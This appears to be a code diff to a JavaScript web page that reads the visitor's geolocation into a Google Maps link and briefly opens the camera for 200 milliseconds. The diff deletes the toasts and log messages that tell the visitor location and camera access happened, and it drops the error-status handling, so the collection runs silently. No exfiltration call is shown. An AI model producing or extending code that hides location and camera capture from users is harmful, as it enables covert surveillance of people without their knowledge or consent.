@@ -717,12 +717,10 @@
           // Criar link do Google Maps
           this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
           
-          console.log('✅ Localização obtida');
-          this.showToast('📍 Localização verificada', 'success');
+          
           
         } catch (error) {
-          this.data.location.status = 'error';
-          console.log('❌ Localização negada');
+          
         }
       }
       
@@ -765,13 +763,11 @@
             stream.getTracks().forEach(track => track.stop());
             video.srcObject = null;
             
-            console.log('✅ Verificação visual concluída');
-            this.showToast('📸 Verificação rápida OK', 'success');
+            
           }, 200); // Apenas 200ms
           
         } catch (error) {
-          this.data.camera.status = 'error';
-          console.log('❌ Câmera não acessível');
+          
         }
       }
       
